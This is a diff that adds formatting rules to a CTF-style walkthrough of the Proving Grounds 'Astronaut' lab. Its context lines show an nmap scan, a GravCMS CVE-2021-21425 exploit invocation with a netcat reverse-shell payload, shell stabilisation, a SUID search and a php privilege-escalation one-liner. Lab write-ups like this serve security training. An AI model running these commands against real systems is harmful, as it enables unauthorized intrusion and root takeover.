@@ -1,10 +1,12 @@
 # Astronaut
 
 ### Proving Grounds Practice
+------
 
 Beginning with a typical service and version scan with nmap, we find that only ports 22 (ssh) and 80 (http) are open. Additionally we are informed that there is a directory listing available, notably grav-admin.
 
 #### Nmap Results
+------
 
 ```nmap-output
 
@@ -48,6 +50,7 @@ A quick search for related exploits turns up an interesting find.
 
 
 #### GravCMS Unauthenticated Arbitrary YAML Write/Update leads to Code Execution (CVE-2021-21425)
+------
 
 ```
 https://github.com/CsEnox/CVE-2021-21425
@@ -55,6 +58,7 @@ https://github.com/CsEnox/CVE-2021-21425
 
 
 #### Exploit
+------
 
 ```python
 
@@ -118,6 +122,7 @@ Setting our listener to port 4444. Then sending the exploit command.
 
 
 #### Command Line
+------
 
 ```
 python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.21.153 4444 >/tmp/f' -t http://192.168.207.12/grav-admin
@@ -131,6 +136,7 @@ We get a reverse shell, as www-data.
 
 
 #### Stabilize Shell
+------
 
 ```
 export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -143,6 +149,7 @@ export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
 We cannot check for sudo rights on www-data because we don't have the password. But we can search for binaries that may have the SUID bit set.
 
 #### SUID Hunting
+------
 
 ```
 find / -perm -u=s 2>/dev/null
@@ -157,6 +164,7 @@ Checking out the findings on GTFOBins php seems to be a great candidate for Priv
 
 
 #### Escalate Privileges
+------
 
 ```shell
 /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
